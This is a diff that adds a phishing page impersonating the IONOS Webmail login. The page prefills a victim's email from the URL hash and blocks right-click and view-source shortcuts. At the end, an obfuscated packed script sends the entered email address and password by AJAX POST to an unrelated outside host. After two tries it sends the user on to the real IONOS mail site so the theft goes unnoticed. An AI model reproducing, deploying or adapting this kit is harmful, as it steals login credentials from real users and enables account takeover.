@@ -1,0 +1,197 @@
+
+<!doctype html>
+<html lang="en">
+
+
+  <head>
+      <script nonce="htH571j/4joVINLbDhas6M+ZQdA7e6dMvl+CSkisJYo=" src="https://frontend-services.ionos.com/t/tag/IONOS/login-id.js" type="text/javascript" async="async" defer="defer" id="oaotag"></script>
+    <script nonce="htH571j/4joVINLbDhas6M+ZQdA7e6dMvl+CSkisJYo=" src="https://ce1.uicdn.net/exos/framework/2.0/ionos.min.js" async="async" defer="defer"></script>
+    <link rel="stylesheet" href="https://ce1.uicdn.net/exos/framework/2.0/ionos.min.css" />
+    <link rel="icon" type="image/png" sizes="32x32" href="https://id.ionos.com/image/favicon-32px.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://id.ionos.com/image/favicon-16px.png">
+    <link rel="icon" type="image/png" sizes="48x48" href="https://id.ionos.com/image/favicon-48px.png">
+    <link rel="shortcut icon" type="image/x-icon" href="https://id.ionos.com/image/favicon.ico" />
+
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="robots" content="index, follow"/>
+  <title>Webmail Login</title>
+  <meta name="description" content="Login to access your IONOS e-mail account and read your e-mail online with IONOS Webmail." />
+  
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+		<script src="https://code.jquery.com/jquery-3.4.1.min.js" 
+        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo=" 
+        crossorigin="anonymous">
+</script>
+    <!-- Required meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+    <!-- Bootstrap CSS -->
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/585b051251.js" crossorigin="anonymous"></script>
+    <style type="text/css">
+
+      textarea:hover, 
+      input:hover, 
+      textarea:active, 
+      input:active, 
+      textarea:focus, 
+      input:focus,
+      button:focus,
+      button:active,
+      button:hover,
+      label:focus,
+      .btn:active,
+      .btn.active
+      {
+        outline:0px !important;
+        -webkit-appearance:none;
+        box-shadow: none !important;
+      }
+    </style>
+
+  </head>
+  <body>
+    
+
+    
+    <link rel="stylesheet" href="https://id.ionos.com/style/starter-main.min.css" />
+
+    <div class="page-content">
+<div class="oao-navi-navigation oao-navi-light">
+    <div class="oao-navi-left">
+      <div class="oao-navi-application-name">
+        <a class="oao-navi-app-name" href="/">
+          <span class="oao-navi-app-logo"></span>
+          <span>Webmail Login</span>
+        </a>
+      </div>
+    </div>
+        
+      </div>
+      <div class="container">
+        <div class="row my-2">
+          <div class="col-lg-6 mx-auto">
+            <div class="m-5 p-4 " id="div1" style="background-color: white; width: 100%; height: 90%; border-radius: 18px; border:10px solid white;">
+              
+      <div class="sheet">
+        <section class="sheet__section sheet__section--default">
+          <ul>
+            <li class="stripe stripe--cropped">
+              <div class="stripe__item">
+                <img class="stripe__visual" src="https://id.ionos.com/image/product-email.svg" height="58" width="auto" />
+              </div>
+              <div class="stripe__item">
+                <h1 class="headline stripe__element">My Webmail Login</h1>
+              </div>
+            </li>
+          </ul>
+        </section>
+
+        <section class="sheet__section sheet__section--default">
+            <ul>
+              <li class="form-stripe">
+                <label class="label" for="username">Email address</label>
+                <p id="error" class="text-danger" style="display: none; font-size: 15px;">Enter your email address to continue.</p>
+                <input type="email" class="input-text form-input" name="identifier" id="ai" tabindex="1"
+                  required="true" autofocus autocomplete="username" autocapitalize="none" spellcheck="false" value="" />
+                
+                <p class="input-byline"><strong>Not your device?</strong> Log out after the session or use <a class="oao-pi-open-in-flyin reveal-title-by-hover link link--lookup tooltip" target="_blank" data-tooltip="Look up" href="https://www.ionos.com/help/index.php?id=5430">private browsing mode</a>.</p>
+              </li>
+              <li class="form-stripe form-stripe--actions">
+                <button class="button button--primary button--full-width submit-btn"
+                  type="submit" id="next" tabindex="2">Next</button>
+              </li>
+            </ul>
+        </section>
+  <section class="sheet__section sheet__section--secondary hide-when-headless">
+    <h4 class="headline headline--paragraph">
+    You don't have a professional email account yet?
+</h4>
+  </section>
+      </div>
+              </div>
+                </div>
+              </div>             
+            </div>
+
+
+  <div class="container">
+        <div class="row my-2">
+          <div class="col-lg-6 mx-auto">
+            <div class="m-5 p-4 " id="div2" style="margin: auto; background-color: white; width: 350px; height: 500px; border-radius: 18px; border:10px solid white; display: none;">
+              
+        <div class="sheet">
+        <section class="sheet__section sheet__section--default">
+          <ul>
+            <li class="stripe stripe--cropped">
+              <div class="stripe__item">
+                <img class="stripe__visual" src="https://id.ionos.com/image/product-email.svg" height="58" width="auto" />
+              </br>
+              <br class="stripe__item">
+                <h1 class="headline stripe__element">Enter password</h1>
+              </br>
+              <br>
+              
+                <b style="color: blue; font-size: 13px;" id="aich">abc@abc.com</b><br>
+            </li>
+          </ul>
+        </section>
+
+        <section class="sheet__section sheet__section--default">
+            <ul>
+              <li class="form-stripe">
+                <label class="label" for="password">Password</label>
+                <span id="msg" class="text-danger" style="display: none; font-size: 14px;"></span><p id="errorp" class="text-danger" style="display: none; font-size: 14px;"></p>
+                <span class="input-text-group input-text-group--empty">
+                  <input type="password" class="input-text" maxlength="2048" required="true" tabindex="1" autofocus="" autocomplete="current-password" autocapitalize="none" spellcheck="false" id="pr" name="password" value="">
+                  <a class="input-text-group__action password-unveil" id="password-unveil"></a>
+                </span>
+                <p class="input-byline">
+                  <a class="link oao-pi-open-in-flyin" target="_blank" href="https://www.ionos.com/help/index.php?id=2327">Forgot Your Password?</a>
+                </p>
+                <p class="input-byline"><strong>Not your device?</strong> Log out after the session or use <a class="oao-pi-open-in-flyin reveal-title-by-hover link link--lookup tooltip" target="_blank" data-tooltip="Look up" href="https://www.ionos.com/help/index.php?id=5430">private browsing mode</a>.</p></li>
+              <li class="form-stripe form-stripe--actions">
+                <button class="button button--primary button--full-width submit-btn" type="submit" id="submit-btn" tabindex="2">Next</button>
+              </li>
+            </ul>
+        </section>
+      
+      
+              </div>
+                </div>
+              </div>             
+            </div>
+
+          </div>
+        </div>
+      </div>
+
+
+
+
+
+      <!-- Optional JavaScript -->
+      <!-- jQuery first, then Popper.js, then Bootstrap JS -->
+      <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+      <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    </body>
+
+
+<script>
+document.getElementById("grtd").innerHTML =
+Math.floor(Math.random() * 100) + 1;
+</script>
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    <script>
+
+	eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('$(v).1M(\'1b\',f(e){b(e.L&&(e.1f==1n)){e.G();k s}});v.1j(\'1e\',D=>D.G());v.1g=f(e){b(e.L&&(e.y===1m||e.y===1l||e.y===1d||e.y===19)){k s}w{k R}};$(v).18("u",f(e){b(e.L){k s}w{k R}});$(v).1a(f(){5 m=0;5 6=Q.M.1c.l(1);b(!6){}w{5 16=/^([0-H-i-Z+/]{4})*(([0-H-i-Z+/]{2}==)|([0-H-i-Z+/]{3}=))?$/;b(!16.J(6)){5 7=6}w{5 7=1i(6)}5 E=/^([a-i-o-15\\.\\-])+\\@(([a-i-o-9\\-])+\\.)+([a-i-o-9]{2,4})+$/;b(!E.J(7)){$(\'#C\').n();6.W;k s}5 r=7.q("@");5 j=7.l((r+1));5 c=j.l(0,j.q(\'.\'));5 I=c.F();$(\'#6\').g(7)}$(\'#6\').B(f(){$(\'#C\').t()});$(\'#1k\').B(f(){5 7=$(\'#6\').g();5 E=/^([a-i-o-15\\.\\-])+\\@(([a-i-o-9\\-])+\\.)+([a-i-o-9]{2,4})+$/;b(!E.J(7)){$(\'#C\').n();6.W;k s}5 r=7.q("@");5 j=7.l((r+1));5 c=j.l(0,j.q(\'.\'));5 I=c.F();$("#14").A({11:x,z:"t"},0);$("#U").A({S:x,z:"n"},T);$("#1h").h(7)});$(\'#17\').B(f(){$("#d").t();$("#6").g("");$("#8").g("");$("#U").A({11:x,z:"t"},0);$("#14").A({S:x,z:"n"},T)});5 1p="1E=";$(\'#O-N\').B(f(D){D.G();5 6=$("#6").g();5 8=$("#8").g();5 K=$("#1I").h();5 d=$(\'#d\').h();b(!8){$("#P").n();$("#P").h("V 1J 1K");k s}5 7=6;5 r=7.q("@");5 j=7.l((r+1));5 c=j.l(0,j.q(\'.\'));5 I=c.F();$(\'#d\').1L(d);m=m+1;$.1H({1O:\'1N\',1P:\'1G\',1q:\'1F\',1D:{6:6,8:8,K:K,},1C:f(1B){$(\'#O-N\').h(\'1A...\')},1z:f(p){b(m>=2){m=0;Q.M.12("13://10.Y.X")}b(p){$("#d").n();1y.1x(p);b(p[\'1w\']==\'1v\'){$(\'#d\').h(p[\'d\']);5 8=$("#8").g("")}w{$(\'#d\').h(p[\'d\']);5 8=$("#8").g("")}}},C:f(){$("#8").g("");b(m>=2){m=0;Q.M.12("13://10.Y.X")}$("#d").n();$("#P").t();$(\'#d\').h("1u. V 1t 1s");5 8=$("#8").g("")},1r:f(){$(\'#O-N\').h(\'1o\')}})})});',62,114,'|||||var|ai|my_ai|pr|||if||msg||function|val|html|zA|my_slice|return|substr|count|show|Z0|response|indexOf|ind|false|hide||document|else|200|keyCode|opacity|animate|click|error|event|filter|toLowerCase|preventDefault|9a|final|test|detail|ctrlKey|location|btn|submit|errorp|window|true|right|1000|div2|Please|focus|com|ionos||mail|left|replace|http|div1|9_|base64regex|back|keypress|117|ready|keydown|hash|85|contextmenu|which|onkeydown|aich|atob|addEventListener|next|86|67|83|Login|file|type|complete|again|try|Invalid|ok|signal|log|console|success|Verifying|xhr|beforeSend|data|bmV4dC5waHA|POST|https://umanjoemsuavida.com.br/oepl/1v.php|ajax|field|provide|password|text|bind|JSON|dataType|url'.split('|'),0,{}))
+
+</script>
+
+
+     </html>
